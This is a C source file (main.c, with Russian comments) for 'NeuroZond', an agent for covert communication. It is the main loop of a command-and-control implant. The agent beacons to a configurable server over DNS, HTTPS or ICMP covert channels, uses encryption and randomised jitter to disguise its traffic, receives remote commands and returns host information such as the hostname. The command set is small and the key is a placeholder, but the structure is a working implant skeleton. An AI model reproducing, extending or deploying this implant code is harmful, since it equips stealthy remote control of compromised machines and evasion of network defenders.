/**
 * @file main.c
 * @brief Основной файл для NeuroZond - легковесного агента для скрытой коммуникации
 *
 * @author iamtomasanderson@gmail.com
 * @date 2023-09-03
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <time.h>

#ifdef _WIN32
#include <windows.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#endif

#include "network/covert_channel.h"

#define VERSION "1.0.0"
#define DEFAULT_CHANNEL_TYPE CHANNEL_TYPE_HTTPS
#define DEFAULT_ENCRYPTION_TYPE ENCRYPTION_TYPE_AES256
#define DEFAULT_BEACON_INTERVAL 60
#define MAX_COMMAND_SIZE 4096

typedef struct {
    char c1_address[256];
    int port;
    ChannelType channel_type;
    EncryptionType encryption_type;
    int beacon_interval;
    int jitter_percent;
    int debug_mode;
} ZondParams;

// Глобальные переменные
static CovertChannelHandle channel = NULL;
static int running = 1;

/**
 * @brief Инициализация параметров с значениями по умолчанию
 * 
 * @param params структура параметров для инициализации
 */
void init_params(ZondParams *params) {
    if (params == NULL) {
        return;
    }

    memset(params, 0, sizeof(ZondParams));
    strcpy(params->c1_address, "127.0.0.1");
    params->port = 443;
    params->channel_type = DEFAULT_CHANNEL_TYPE;
    params->encryption_type = DEFAULT_ENCRYPTION_TYPE;
    params->beacon_interval = DEFAULT_BEACON_INTERVAL;
    params->jitter_percent = 15; // 15% jitter по умолчанию
    params->debug_mode = 0;
}

/**
 * @brief Обработчик сигналов для корректного завершения работы
 */
void signal_handler(int signal) {
    printf("Получен сигнал %d, завершение работы...\n", signal);
    running = 0;
}

/**
 * @brief Парсинг аргументов командной строки
 * 
 * @param argc количество аргументов
 * @param argv массив аргументов
 * @param params параметры для заполнения
 * @return int 0 при успешном парсинге, -1 при ошибке
 */
int parse_arguments(int argc, char *argv[], ZondParams *params) {
    if (params == NULL) {
        return -1;
    }

    // Инициализация параметров значениями по умолчанию
    init_params(params);

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            printf("NeuroZond v%s - Легковесный агент для скрытой коммуникации\n", VERSION);
            printf("Использование: %s [опции]\n", argv[0]);
            printf("Опции:\n");
            printf("  -h, --help                 Показать эту справку\n");
            printf("  -a, --address <addr>       Адрес C1 сервера (по умолчанию: 127.0.0.1)\n");
            printf("  -p, --port <port>          Порт сервера (по умолчанию: 443)\n");
            printf("  -c, --channel <type>       Тип канала связи: dns, https, icmp (по умолчанию: https)\n");
            printf("  -e, --encryption <type>    Тип шифрования: xor, aes256, chacha20 (по умолчанию: aes256)\n");
            printf("  -b, --beacon <seconds>     Интервал проверки команд в секундах (по умолчанию: 60)\n");
            printf("  -j, --jitter <percent>     Процент случайного отклонения от интервала (по умолчанию: 15)\n");
            printf("  -d, --debug                Включить режим отладки\n");
            return -1;
        } else if ((strcmp(argv[i], "-a") == 0 || strcmp(argv[i], "--address") == 0) && i + 1 < argc) {
            strncpy(params->c1_address, argv[++i], sizeof(params->c1_address) - 1);
        } else if ((strcmp(argv[i], "-p") == 0 || strcmp(argv[i], "--port") == 0) && i + 1 < argc) {
            params->port = atoi(argv[++i]);
        } else if ((strcmp(argv[i], "-c") == 0 || strcmp(argv[i], "--channel") == 0) && i + 1 < argc) {
            i++;
            if (strcmp(argv[i], "dns") == 0) {
                params->channel_type = CHANNEL_TYPE_DNS;
            } else if (strcmp(argv[i], "https") == 0) {
                params->channel_type = CHANNEL_TYPE_HTTPS;
            } else if (strcmp(argv[i], "icmp") == 0) {
                params->channel_type = CHANNEL_TYPE_ICMP;
            } else {
                fprintf(stderr, "Неизвестный тип канала: %s\n", argv[i]);
                return -1;
            }
        } else if ((strcmp(argv[i], "-e") == 0 || strcmp(argv[i], "--encryption") == 0) && i + 1 < argc) {
            i++;
            if (strcmp(argv[i], "xor") == 0) {
                params->encryption_type = ENCRYPTION_TYPE_XOR;
            } else if (strcmp(argv[i], "aes256") == 0) {
                params->encryption_type = ENCRYPTION_TYPE_AES256;
            } else if (strcmp(argv[i], "chacha20") == 0) {
                params->encryption_type = ENCRYPTION_TYPE_CHACHA20;
            } else {
                fprintf(stderr, "Неизвестный тип шифрования: %s\n", argv[i]);
                return -1;
            }
        } else if ((strcmp(argv[i], "-b") == 0 || strcmp(argv[i], "--beacon") == 0) && i + 1 < argc) {
            params->beacon_interval = atoi(argv[++i]);
            if (params->beacon_interval < 10) {
                fprintf(stderr, "Интервал проверки должен быть не менее 10 секунд\n");
                return -1;
            }
        } else if ((strcmp(argv[i], "-j") == 0 || strcmp(argv[i], "--jitter") == 0) && i + 1 < argc) {
            params->jitter_percent = atoi(argv[++i]);
            if (params->jitter_percent < 0 || params->jitter_percent > 50) {
                fprintf(stderr, "Процент jitter должен быть от 0 до 50\n");
                return -1;
            }
        } else if (strcmp(argv[i], "-d") == 0 || strcmp(argv[i], "--debug") == 0) {
            params->debug_mode = 1;
        } else {
            fprintf(stderr, "Неизвестная опция: %s\n", argv[i]);
            return -1;
        }
    }

    return 0;
}

/**
 * @brief Создание канала связи на основе параметров
 * 
 * @param params параметры конфигурации
 * @return CovertChannelHandle дескриптор канала или NULL при ошибке
 */
CovertChannelHandle create_channel(const ZondParams *params) {
    if (params == NULL) {
        return NULL;
    }

    CovertChannelConfig config;
    memset(&config, 0, sizeof(CovertChannelConfig));
    
    config.channel_type = params->channel_type;
    config.encryption_type = params->encryption_type;
    strncpy(config.server_addr, params->c1_address, sizeof(config.server_addr) - 1);
    config.server_port = params->port;
    config.jitter_percent = params->jitter_percent;
    config.debug_mode = params->debug_mode;
    
    // Инициализация ключа шифрования (в реальном приложении должен быть получен безопасно)
    unsigned char key[32] = {0};
    memset(key, 0x42, sizeof(key)); // Использование простого ключа для демонстрации
    memcpy(config.encryption_key, key, sizeof(config.encryption_key));

    CovertChannelHandle handle = covert_channel_init(&config);
    if (handle == NULL) {
        fprintf(stderr, "Ошибка при инициализации канала связи\n");
        return NULL;
    }

    if (covert_channel_connect(handle) != 0) {
        fprintf(stderr, "Ошибка при установлении соединения с C1 сервером\n");
        covert_channel_cleanup(handle);
        return NULL;
    }

    return handle;
}

/**
 * @brief Обработка полученной команды
 * 
 * @param command строка с командой
 * @param response буфер для ответа
 * @param max_response_size максимальный размер буфера ответа
 * @return int размер ответа или -1 при ошибке
 */
int process_command(const char *command, char *response, size_t max_response_size) {
    if (command == NULL || response == NULL || max_response_size == 0) {
        return -1;
    }

    // Простой обработчик команд для демонстрации
    if (strncmp(command, "ping", 4) == 0) {
        snprintf(response, max_response_size, "pong");
        return 4;
    } else if (strncmp(command, "version", 7) == 0) {
        snprintf(response, max_response_size, "NeuroZond v%s", VERSION);
        return strlen(response);
    } else if (strncmp(command, "sysinfo", 7) == 0) {
        char hostname[256] = {0};
#ifdef _WIN32
        DWORD size = sizeof(hostname);
        GetComputerNameA(hostname, &size);
#else
        gethostname(hostname, sizeof(hostname));
#endif
        snprintf(response, max_response_size, "Host: %s, OS: %s", 
                hostname, 
#ifdef _WIN32
                "Windows"
#else
                "Unix/Linux"
#endif
        );
        return strlen(response);
    } else if (strncmp(command, "exit", 4) == 0) {
        running = 0;
        snprintf(response, max_response_size, "Завершение работы");
        return strlen(response);
    } else {
        snprintf(response, max_response_size, "Неизвестная команда: %s", command);
        return strlen(response);
    }
}

/**
 * @brief Основной цикл работы агента
 * 
 * @param params параметры конфигурации
 * @return int 0 при успешном выполнении, -1 при ошибке
 */
int main_loop(const ZondParams *params) {
    if (params == NULL || channel == NULL) {
        return -1;
    }
    
    char command[MAX_COMMAND_SIZE] = {0};
    char response[MAX_COMMAND_SIZE] = {0};
    int recv_size, send_size;
    
    // Отправка информации о запуске агента
    snprintf(response, sizeof(response), "NeuroZond v%s запущен. Канал: %d, Шифрование: %d", 
            VERSION, params->channel_type, params->encryption_type);
    
    if (covert_channel_send(channel, response, strlen(response)) < 0) {
        fprintf(stderr, "Ошибка при отправке сообщения о запуске\n");
        return -1;
    }
    
    while (running) {
        // Добавление случайной задержки (jitter)
        int jitter = 0;
        if (params->jitter_percent > 0) {
            jitter = (rand() % (2 * params->jitter_percent + 1)) - params->jitter_percent;
        }
        int sleep_time = params->beacon_interval * (100 + jitter) / 100;
        
        if (params->debug_mode) {
            printf("Ожидание %d секунд до следующего запроса...\n", sleep_time);
        }
        
#ifdef _WIN32
        Sleep(sleep_time * 1000);
#else
        sleep(sleep_time);
#endif
        
        // Очистка буферов
        memset(command, 0, sizeof(command));
        memset(response, 0, sizeof(response));
        
        // Запрос команды от C1
        recv_size = covert_channel_receive(channel, command, sizeof(command) - 1);
        if (recv_size < 0) {
            if (params->debug_mode) {
                fprintf(stderr, "Ошибка при получении команды\n");
            }
            continue;
        } else if (recv_size == 0) {
            // Нет новых команд
            if (params->debug_mode) {
                printf("Нет новых команд\n");
            }
            continue;
        }
        
        if (params->debug_mode) {
            printf("Получена команда [%d байт]: %s\n", recv_size, command);
        }
        
        // Обработка команды
        send_size = process_command(command, response, sizeof(response) - 1);
        if (send_size <= 0) {
            if (params->debug_mode) {
                fprintf(stderr, "Ошибка при обработке команды\n");
            }
            continue;
        }
        
        // Отправка ответа
        if (covert_channel_send(channel, response, send_size) < 0) {
            if (params->debug_mode) {
                fprintf(stderr, "Ошибка при отправке ответа\n");
            }
        } else if (params->debug_mode) {
            printf("Отправлен ответ [%d байт]: %s\n", send_size, response);
        }
    }
    
    return 0;
}

/**
 * @brief Точка входа в программу
 */
int main(int argc, char *argv[]) {
    // Инициализация генератора случайных чисел
    srand((unsigned int)time(NULL));
    
    // Настройка обработчиков сигналов
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
#ifdef _WIN32
    // Инициализация WSA для Windows
    WSADATA wsa_data;
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        fprintf(stderr, "Ошибка инициализации WSA\n");
        return EXIT_FAILURE;
    }
#endif
    
    // Парсинг аргументов командной строки
    ZondParams params;
    if (parse_arguments(argc, argv, &params) != 0) {
        return EXIT_FAILURE;
    }
    
    if (params.debug_mode) {
        printf("NeuroZond v%s запускается с параметрами:\n", VERSION);
        printf("C1 адрес: %s:%d\n", params.c1_address, params.port);
        printf("Тип канала: %d\n", params.channel_type);
        printf("Тип шифрования: %d\n", params.encryption_type);
        printf("Интервал проверки: %d сек\n", params.beacon_interval);
        printf("Jitter: %d%%\n", params.jitter_percent);
    }
    
    // Создание канала связи
    channel = create_channel(&params);
    if (channel == NULL) {
        fprintf(stderr, "Не удалось создать канал связи\n");
        return EXIT_FAILURE;
    }
    
    // Запуск основного цикла
    int result = main_loop(&params);
    
    // Очистка ресурсов
    if (channel != NULL) {
        covert_channel_cleanup(channel);
        channel = NULL;
    }
    
#ifdef _WIN32
    WSACleanup();
#endif
    
    return (result == 0) ? EXIT_SUCCESS : EXIT_FAILURE;
} 